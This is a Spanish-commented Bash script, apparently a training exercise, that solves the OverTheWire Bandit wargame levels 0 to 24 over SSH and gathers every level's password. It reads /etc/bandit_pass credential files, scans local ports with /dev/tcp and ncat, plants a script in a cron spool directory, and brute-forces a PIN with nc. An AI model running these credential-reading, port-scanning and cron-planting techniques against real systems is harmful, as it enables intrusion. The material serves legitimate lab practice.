#!/bin/bash

#Colores
greenColour="\e[0;32m\033[1m"
grayColour="\e[0;37m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"

#Conexion ssh hacia Bandit0
cone0(){
echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit0...${endColour}\n\n"
sshpass -p 'bandit0' ssh bandit0@bandit.labs.overthewire.org -p 2220 <<'EOF' > B1 
cat readme | tail -2 | head -1 | awk {'print $NF'}
EOF
}

#Conexion ssh hacia Bandit1
cone1(){
echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit1...${endColour}\n\n"
sshpass -f B1 ssh bandit1@bandit.labs.overthewire.org -p 2220 <<'EOF' > B2 
cat ./-
EOF
}

#Conexion ssh hacia Bandit2
cone2(){
echo -e
sshpass -f B2 ssh bandit2@bandit.labs.overthewire.org -p 2220 <<'EOF' > B3 
cat -- --spaces\ in\ this\ filename--
EOF
}

#Conexion ssh hacia Bandit3
cone3(){
echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit3...${endColour}\n\n"
sshpass -f B3 ssh bandit3@bandit.labs.overthewire.org -p 2220 <<'EOF' > B4 
cd inhere
vision=$(ls -la | tail -1 | awk {'print $NF'})
cat $vision
EOF
}

#Conexion ssh hacia Bandit4
cone4(){
echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit4...${endColour}\n\n"
sshpass -f B4 ssh bandit4@bandit.labs.overthewire.org -p 2220 <<'EOF' > B5 
cd inhere
cat ./-file07
EOF
}

#Conexion ssh hacia Bandit5
cone5(){
echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit5...${endColour}\n\n"
sshpass -f B5 ssh bandit5@bandit.labs.overthewire.org -p 2220 <<'EOF' > B6 
cd inhere
find -readable -size 1033c &> /dev/null
cat ./maybehere07/.file2 | head -1
EOF
}

#Conexion ssh hacia Bandit6
cone6(){
echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit6...${endColour}\n\n"
sshpass -f B6 ssh bandit6@bandit.labs.overthewire.org -p 2220 <<'EOF' > B7 
pass=$(find / -group bandit6 -user bandit7 -size 33c 2> /dev/null)
cat $pass
EOF
}

#Conexion ssh hacia Bandit7
cone7(){
echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit7...${endColour}\n\n"
sshpass -f B7 ssh bandit7@bandit.labs.overthewire.org -p 2220 <<'EOF' > B8 
cat data.txt | grep millionth | awk {'print $NF'}
EOF
}

#Conexion ssh hacia Bandit8
cone8(){
echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit8...${endColour}\n\n"
sshpass -f B8 ssh bandit8@bandit.labs.overthewire.org -p 2220 <<'EOF' > B9
sort data.txt | uniq -u
EOF
}


#Conexion ssh hacia Bandit9
cone9(){
echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit9...${endColour}\n\n"
sshpass -f B9 ssh bandit9@bandit.labs.overthewire.org -p 2220 <<'EOF' > B10
strings data.txt | grep '===' | tail -1 | awk {'print $NF'}
EOF
}

#Conexion ssh hacia Bandit10
cone10(){
echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit10...${endColour}\n\n"
sshpass -f B10 ssh bandit10@bandit.labs.overthewire.org -p 2220 <<'EOF' > B11
base64 -d data.txt | awk {'print $NF'}
EOF
}

#Conexion ssh hacia Bandit11
cone11(){
echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit11...${endColour}\n\n"
sshpass -f B11 ssh bandit11@bandit.labs.overthewire.org -p 2220 <<'EOF' > B12
cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m' | awk {'print $NF'}
EOF
}

#Conexion ssh hacia Bandit12
cone12(){
echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit12...${endColour}\n\n"
sshpass -f B12 ssh bandit12@bandit.labs.overthewire.org -p 2220 <<'EOF' > data.txt
cat data.txt
EOF
cat data.txt | xxd -r | sponge data.txt
mv data.txt hex.gz
arch1=$(7z l hex.gz | tail -3 | head -1 | awk '{print$NF}')
$(7z x hex.gz &> /dev/null)
arch2=$(7z l $arch1 | tail -3 | head -1 | awk '{print$NF}')
$(7z x $arch1 &> /dev/null)
arch3=$(7z l $arch2 | tail -3 | head -1 | awk '{print$NF}')
$(7z x $arch2 &> /dev/null)
arch4=$(7z l $arch3 | tail -3 | head -1 | awk '{print$NF}')
$(7z x $arch3 &> /dev/null)
arch5=$(7z l $arch4 | tail -3 | head -1 | awk '{print$NF}')
$(7z x $arch4 &> /dev/null)
arch6=$(7z l $arch5 | tail -3 | head -1 | awk '{print$NF}')
$(7z x $arch5 &> /dev/null)
arch7=$(7z l $arch6 | tail -3 | head -1 | awk '{print$NF}')
$(7z x $arch6 &> /dev/null)
arch8=$(7z l $arch7 | tail -3 | head -1 | awk '{print$NF}')
$(7z x $arch7 &> /dev/null)
mv $arch8 trial
cat trial | awk {'print $NF'} > B13
rm *.bin data2 data6 hex.gz trial
}

#Conexion ssh hacia Bandit13
cone13(){
echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit13...${endColour}\n\n"
sshpass -f B13 ssh bandit13@bandit.labs.overthewire.org -p 2220 <<'EOF' > B14
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i sshkey.private bandit14@127.0.0.1 -p 2220 <<'EOF'
cat /etc/bandit_pass/bandit14
EOF
}

#Conexion ssh hacia Bandit14
cone14(){
echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit14...${endColour}\n\n"
pass=$(<B14)
sshpass -f B14 ssh bandit14@bandit.labs.overthewire.org -p 2220 << EOF > B15
echo "$pass" | ncat 127.0.0.1 30000 | tail -2 | head -1
EOF
}

#Conexion ssh hacia Bandit15
cone15(){
  echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit15...${endColour}\n\n"
  pass15=$(<B15)
  sshpass -f B15 ssh bandit15@bandit.labs.overthewire.org -p 2220 << EOF > B16
echo " " > /dev/tcp/127.0.0.1/30001 2> /dev/null && echo "$pass15" | ncat --ssl 127.0.0.1 30001 | tail -2 | head -1
EOF
}

#Conexion ssh hacia Bandit16
cone16(){
  echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit16...${endColour}\n\n"
  pass16=$(<B16)
  sshpass -f B16 ssh bandit16@bandit.labs.overthewire.org -p 2220 << EOF | tail -1 | awk '{print $1}' > B17
dirtmp=\$(mktemp -d)
cd \$dirtmp
for port in {31000..32000}; do 
  (echo " " > /dev/tcp/127.0.0.1/\$port) 2> /dev/null && echo "$pass16" | ncat --ssl 127.0.0.1 \$port >> id_rsa
done
cat id_rsa | tail -n 28
tail -n 28 id_rsa > id_rsaC && chmod 600 id_rsaC
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i id_rsaC bandit17@127.0.0.1 -p 2220 << EOF2
cat /etc/bandit_pass/bandit17
EOF2
EOF
}

#Conexion ssh Bandit 17
cone17(){
echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit17...${endColour}\n\n" 
sshpass -f B17 ssh bandit17@bandit.labs.overthewire.org -p 2220 << 'EOF' diff passwords.old passwords.new | tail -1 | awk '{print $2}' > B18
EOF
}

#Conexion ssh Bandit 18
cone18(){
echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit18...${endColour}\n\n" 
sshpass -f B18 ssh bandit18@bandit.labs.overthewire.org -p 2220 'cat readme' > B19
}

#Conexion ssh Bandit 19
cone19(){
echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit19...${endColour}\n\n" 
sshpass -f B19 ssh bandit19@bandit.labs.overthewire.org -p 2220 << 'EOF' > B20
./bandit20-do cat /etc/bandit_pass/bandit20
EOF
}

#Conexion ssh Bandit20
cone20(){
echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit20...${endColour}\n\n" 
passd=$(<B20)
sshpass -f B20 ssh bandit20@bandit.labs.overthewire.org -p 2220 << EOF > B21
echo -n '$passd' | nc -l -p 50003 | tail& 
sleep 5
./suconnect 50003 
exit
EOF
cat B21 | tail -1 > trial
rm B21
mv trial B21
}

#Conexion ssh Bandit21
cone21(){
echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit21...${endColour}\n\n" 
sshpass -f B21 ssh bandit21@bandit.labs.overthewire.org -p 2220 << 'EOF' > B22
ruta=$(cat /usr/bin/cronjob_bandit22.sh | tail -1 | awk {'print $NF'})
cat $ruta
exit
EOF
}

#Conexion ssh Bandit22
cone22(){
echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit22...${endColour}\n\n" 
sshpass -f B22 ssh bandit22@bandit.labs.overthewire.org -p 2220 << 'EOF' > B23
mytarget=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
cat /tmp/$mytarget
exit
EOF
}

#Conexion ssh Bandit23
cone23(){
echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit23...${endColour}\n\n"
echo -e "\n${greenColour}[+]${endColour}${grayColour} Esperando a la ejecucion de la tarea cron...${endColour}\n\n" 
sshpass -f B23 ssh bandit23@bandit.labs.overthewire.org -p 2220 << 'EOF' > B24
mkdir /tmp/lockdown
cd /tmp/lockdown
chmod 777 /tmp/lockdown
touch script.sh
chmod 777 script.sh
echo '#!/bin/bash' > script.sh
echo 'cat /etc/bandit_pass/bandit24 > /tmp/lockdown/pass' >> script.sh
touch pass
chmod 777 pass
cp script.sh /var/spool/bandit24/foo/lockdown.sh
sleep 60
cat pass
rm *
cd ..
rmdir lockdown
exit
EOF
}

#Conexion ssh Bandit24
cone24(){
echo -e "\n\n${greenColour}[!]${endColour}${grayColour} Conectando a Bandit24...${endColour}\n\n" 
password=$(<B24)
sshpass -f B24 ssh bandit24@bandit.labs.overthewire.org -p 2220 << EOF > B25
seq -f %04g 10000 | xargs printf "$password %s\n" | nc localhost 30002 | grep bandit25 | tail -1 | awk {'print \$7'}
EOF
}

saveB(){
for i in $(seq 1 25);do
echo -e "Contraseña para Bandit$i: $(cat B$i)" 2> /dev/null
done >> PASS
}
deleteB(){
for i in $(seq 1 25);do
rm B$i
done
}

retry() {
  archivo="$1"
  funcion="$2"

  until [ -s "$archivo" ]; do
    echo -e "${redColour}[!]${endColour}${grayColour}Contraseña no almacenada, reintendando conexion...${endColour}"
    sleep 2
    $funcion
  done
  echo -e "${greenColour}[+]${grayColour} Se capturo la contraseña del nivel en el archivo:${endColour} $archivo"
}

#MAIN
for i in {0..24};do
ssh="cone$i"
sum=$(($i+1))
$ssh
retry "B$sum" $ssh 
done
saveB
deleteB


#Mentorias D4ZC
echo -e "${grayColour}\n\n\n\n\nScript by GriZzly${endColour}"
